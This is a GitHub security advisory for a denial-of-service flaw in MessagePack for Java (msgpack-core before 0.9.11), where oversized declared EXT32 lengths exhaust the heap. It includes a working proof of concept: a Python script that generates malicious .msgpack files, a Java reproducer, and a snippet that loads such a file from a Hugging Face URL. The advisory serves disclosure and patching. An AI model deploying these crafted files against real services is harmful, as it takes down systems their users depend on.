# [H] MessagePack for Java Vulnerable to Remote DoS via Malicious EXT Payload Allocation

## Summary
Severity: High
Advisory: GHSA-cw39-r4h6-8j3x
CVE: CVE-2026-21452
CWE: CWE-400, CWE-789
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-01-05
Source: https://github.com/advisories/GHSA-cw39-r4h6-8j3x
Type: github-advisory

## Affected
- Maven: `org.msgpack:msgpack-core` — affected >=0 <0.9.11

## Details
### Summary
Affected Components:
```
org.msgpack.core.MessageUnpacker.readPayload()
org.msgpack.core.MessageUnpacker.unpackValue()
org.msgpack.value.ExtensionValue.getData()
```
A denial-of-service vulnerability exists in MessagePack for Java when deserializing .msgpack files containing EXT32 objects with attacker-controlled payload lengths. While MessagePack-Java parses extension headers lazily, it later trusts the declared EXT payload length when materializing the extension data. When ExtensionValue.getData() is invoked, the library attempts to allocate a byte array of the declared length without enforcing any upper bound. A malicious .msgpack file of only a few bytes can therefore trigger unbounded heap allocation, resulting in JVM heap exhaustion, process termination, or service unavailability. This vulnerability is triggered during model loading / deserialization, making it a model format vulnerability suitable for remote exploitation.

### PoC
```
import msgpack
import struct
import os

OUTPUT_DIR = "bombs"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# EXT format: fixext / ext8 / ext16 / ext32
# ext32 allows attacker-controlled length (uint32)

length = 1
step = 10_000_000

while True:
    try:
        # EXT32: 0xC9 | length (4 bytes) | type (1 byte)
        header = b'\xC9' + struct.pack(">I", length) + b'\x01'
        payload = b'A'   # actual data tiny

        data = header + payload

        fname = f"{OUTPUT_DIR}/ext_length_{length}.msgpack"
        with open(fname, "wb") as f:
            f.write(data)

        print(f"[+] Generated EXT bomb with declared length={length}")
        length += step

    except Exception as e:
        print("[!] Stopped:", e)
        break
```
Download dependency: curl -LO https://repo1.maven.org/maven2/org/msgpack/msgpack-core/0.9.8/msgpack-core-0.9.8.jar Java Reproducer
```
// Main.java
import org.msgpack.core.MessagePack;
import org.msgpack.core.MessageUnpacker;
import org.msgpack.value.ExtensionValue;

import java.nio.file.Files;
import java.nio.file.Paths;

public class Main {
    public static void main(String[] args) throws Exception {

        byte[] data = Files.readAllBytes(
            Paths.get("ext_length_470000001.msgpack")
        );

        MessageUnpacker unpacker =
            MessagePack.newDefaultUnpacker(data);

        ExtensionValue ext =
            unpacker.unpackValue().asExtensionValue();

        // Vulnerability trigger:
        byte[] payload = ext.getData();

        System.out.println(payload.length);
    }
}

```
Compile
```
javac -cp msgpack-core-0.9.8.jar Main.java
```
Run (with limited heap)
```
java -Xmx256m -cp .:msgpack-core-0.9.8.jar Main
```
Observed Result:
```
Exception in thread "main" java.lang.OutOfMemoryError: Java heap space
    at org.msgpack.core.MessageUnpacker.readPayload(...)
    at org.msgpack.core.MessageUnpacker.unpackValue(...)
```
```
var u = new java.net.URL("https://huggingface.co/Blackbloodhacker/msgpack/resolve/main/ext_length_470000001.msgpack");
var d = u.openStream().readAllBytes();
var up = org.msgpack.core.MessagePack.newDefaultUnpacker(d);
up.unpackValue().asExtensionValue().getData();
```
Run:
```
java -Xmx256m -cp .:msgpack-core-0.9.8.jar Main
```
A remotely hosted model file on Hugging Face can cause denial of service when loaded by a Java-based consumer.

## Resolution 
This issue is addressed in https://github.com/msgpack/msgpack-java/commit/daa2ea6b2f11f500e22c70a22f689f7a9debdeae by gradually allocating memory for large inputs, for both EXT32/BIN32 data types. This patch is released in msgpack-java 0.9.11 https://github.com/msgpack/msgpack-java/releases/tag/v0.9.11

### Impact
This vulnerability enables a remote denial-of-service attack against applications that deserialize untrusted .msgpack model files using MessagePack for Java. A specially crafted but syntactically valid .msgpack file containing an EXT32 object with an attacker-controlled, excessively large payload length can trigger unbounded memory allocation during deserialization. When the model file is loaded, the library trusts the declared length metadata and attempts to allocate a byte array of that size, leading to rapid heap exhaustion, excessive garbage collection, or immediate JVM termination with an OutOfMemoryError. The attack requires no malformed bytes, user interaction, or elevated privileges and can be exploited remotely in real-world environments such as model registries, inference services, CI/CD pipelines, and cloud-based model hosting platforms that accept or fetch .msgpack artifacts. Because the malicious file is extremely small yet valid, it can bypass basic validation and scanning mechanisms, resulting in complete service unavailability and potential cascading failures in production systems.

## References
- https://github.com/msgpack/msgpack-java/security/advisories/GHSA-cw39-r4h6-8j3x
- https://nvd.nist.gov/vuln/detail/CVE-2026-21452
- https://github.com/msgpack/msgpack-java/commit/daa2ea6b2f11f500e22c70a22f689f7a9debdeae
- https://github.com/msgpack/msgpack-java
- https://github.com/msgpack/msgpack-java/releases/tag/v0.9.11
